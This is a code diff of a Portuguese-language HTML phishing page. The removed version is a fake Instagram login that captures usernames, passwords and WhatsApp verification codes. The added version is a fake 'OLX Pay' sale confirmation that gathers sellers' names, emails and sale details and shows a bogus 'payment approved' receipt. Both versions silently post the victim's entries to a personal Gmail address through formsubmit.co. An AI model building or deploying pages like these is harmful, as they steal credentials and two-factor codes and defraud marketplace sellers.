@@ -1,81 +1,131 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OLX Pay - Confirmação de Venda</title>
   <style>
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
-    }
-
-    .container {
-      background: white;
-      padding: 40px 30px;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      color: #333;
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 20px;
       border: 1px solid #ddd;
+      border-radius: 10px;
+      background-color: #fff;
+    }
+
+    h2, h3, h1 {
+      color: #ff6600;
       text-align: center;
-      width: 100%;
-      max-width: 320px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      margin: auto;
     }
 
-    .logo {
-      width: 100px;
-      margin-bottom: 20px;
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
     }
 
-    input, button {
+    input {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
+      margin-top: 5px;
       border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 14px;
-      box-sizing: border-box;
+      border-radius: 5px;
     }
 
-    button {
-      background-color: #3897f0;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
+    .btn {
+      margin-top: 20px;
+      width: 100%;
+      background-color: #ff6600;
+      color: #fff;
+      padding: 12px;
       border: none;
-      transition: background-color 0.3s;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
     }
 
-    button:hover {
-      background-color: #318bda;
-    }
-
-    .footer {
-      font-size: 12px;
-      color: #999;
-      margin-top: 15px;
+    .btn:hover {
+      background-color: #e65c00;
     }
 
     .hidden {
       display: none;
     }
 
-    .loading {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    .confirmacao, .final {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 20px;
+      margin-top: 30px;
     }
 
-    .loading img {
+    .status {
+      background-color: #ffebcc;
+      padding: 15px;
+      border-radius: 5px;
+      margin-top: 20px;
+      font-weight: bold;
+      color: #995700;
+      border: 1px solid #ffcc80;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #777;
+      text-align: center;
+    }
+
+    .link-confirmar, .link-site {
+      display: inline-block;
+      background-color: #ff6600;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .center {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    /* Animação de carregamento */
+    #barraCarregamento {
+      width: 0;
+      height: 5px;
+      background-color: #ff6600;
+      transition: width 3s;
+      margin-top: 20px;
+    }
+
+    .loading-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      margin-top: 30px;
+    }
+
+    .loading-container p {
+      font-weight: bold;
+      color: #333;
+      margin-top: 10px;
+    }
+
+    .loading-container img {
       width: 40px;
-      margin-bottom: 10px;
+      margin-top: 20px;
       animation: spin 1s linear infinite;
     }
 
@@ -86,90 +136,112 @@
   </style>
 </head>
 <body>
-  <!-- Tela de login -->
-  <div class="container" id="login">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
-    <form id="loginForm">
-      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
-      <input type="password" name="password" placeholder="Senha" required />
-      <button type="submit">Entrar</button>
+
+  <!-- Tela de Formulário -->
+  <div id="formulario">
+    <h2>
+      <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" alt="Cadeado" style="width:20px;vertical-align:middle;margin-right:5px;">
+      OLX Pay - Confirmação de Venda
+    </h2>
+
+    <form id="vendaForm">
+      <label for="nome">Seu nome completo:</label>
+      <input type="text" id="nome" name="nome" required>
+
+      <label for="email">Seu e-mail OLX:</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="produto">Produto vendido:</label>
+      <input type="text" id="produto" name="produto" required>
+
+      <label for="valor">Valor da venda (R$):</label>
+      <input type="text" id="valor" name="valor" required>
+
+      <button type="submit" class="btn">Confirmar venda</button>
     </form>
-    <div class="footer">© 2025 Instagram from Meta</div>
   </div>
 
-  <!-- Tela do código -->
-  <div class="container hidden" id="codigo">
-    <h3>Verificação de segurança</h3>
-    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
-    <form id="codigoForm">
-      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
-      <button type="submit">Confirmar</button>
-    </form>
-  </div>
+  <!-- Tela de Comprovante -->
+  <div id="comprovante" class="confirmacao hidden">
+    <h3>Pagamento aprovado – envie seu produto</h3>
+    <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
+    <p><strong>Valor:</strong> <span id="valorInfo"></span></p>
+    <p><strong>Forma de envio:</strong> Motoboy OLX Pay (entrega hoje)</p>
+    <p><strong>Código de postagem:</strong> BR345671234BR</p>
 
-  <!-- Carregando 1 -->
-  <div class="container hidden" id="carregando1">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Verificando código...</p>
+    <div class="status">
+      Pagamento aprovado e aguardando confirmação do vendedor.
+    </div>
+
+    <div class="center">
+      <span class="link-confirmar" onclick="iniciarCarregamento()">Clique aqui para confirmar a transação</span>
+    </div>
+
+    <div class="footer">
+      Você receberá um e-mail de confirmação com os detalhes da transação.<br>
+      OLX Pay é um serviço de pagamento seguro com garantia de entrega.
     </div>
   </div>
 
-  <!-- Carregando 2 -->
-  <div class="container hidden" id="carregando2">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Pagamento sendo processado...</p>
+  <!-- Barra de carregamento entre as páginas -->
+  <div id="barraCarregamento"></div>
+
+  <!-- Tela Final -->
+  <div id="final" class="final hidden">
+    <h1>Parabéns!</h1>
+    <p style="text-align: center; font-size: 16px; margin-top: 10px;">
+      Sua confirmação foi recebida com sucesso.<br><br>
+      Você receberá um <strong>e-mail de confirmação</strong> com todos os detalhes em instantes.<br><br>
+      Obrigado por utilizar o OLX Pay.
+    </p>
+
+    <div class="center">
+      <a class="link-site" href="https://www.olx.com.br" target="_blank">Ir para o site oficial da OLX</a>
     </div>
   </div>
 
-  <!-- Tela final -->
-  <div class="container hidden" id="final">
-    <h2>Parabéns!</h2>
-    <p>Cadastro realizado com sucesso.</p>
-    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
+  <!-- Loading container -->
+  <div id="loading" class="loading-container hidden">
+    <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
+    <p>Aguarde enquanto processamos sua transação...</p>
   </div>
 
   <script>
-    const loginForm = document.getElementById("loginForm");
-    const codigoForm = document.getElementById("codigoForm");
-
-    loginForm.addEventListener("submit", function(e) {
+    document.getElementById("vendaForm").addEventListener("submit", function (e) {
       e.preventDefault();
-      document.getElementById("login").classList.add("hidden");
-      document.getElementById("codigo").classList.remove("hidden");
 
-      const dados = new FormData(loginForm);
+      const form = e.target;
+      const dados = {
+        nome: form.nome.value,
+        email: form.email.value,
+        produto: form.produto.value,
+        valor: form.valor.value
+      };
+
+      document.getElementById("produtoInfo").innerText = dados.produto;
+      document.getElementById("valorInfo").innerText = "R$ " + dados.valor;
+      document.getElementById("formulario").classList.add("hidden");
+      document.getElementById("comprovante").classList.remove("hidden");
+
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(dados)
       });
     });
 
-    codigoForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      document.getElementById("codigo").classList.add("hidden");
-      document.getElementById("carregando1").classList.remove("hidden");
+    function iniciarCarregamento() {
+      // Exibe o carregamento entre as páginas
+      document.getElementById("barraCarregamento").style.width = "100%";
+      document.getElementById("comprovante").classList.add("hidden");
+      document.getElementById("loading").classList.remove("hidden");
 
-      const dadosCodigo = new FormData(codigoForm);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dadosCodigo
-      });
-
-      // Simula carregamento
       setTimeout(() => {
-        document.getElementById("carregando1").classList.add("hidden");
-        document.getElementById("carregando2").classList.remove("hidden");
-
-        setTimeout(() => {
-          document.getElementById("carregando2").classList.add("hidden");
-          document.getElementById("final").classList.remove("hidden");
-        }, 2500);
-      }, 2500);
-    });
+        document.getElementById("loading").classList.add("hidden");
+        document.getElementById("final").classList.remove("hidden");
+      }, 3000); // 3 segundos de "carregamento"
+    }
   </script>
+
 </body>
 </html>
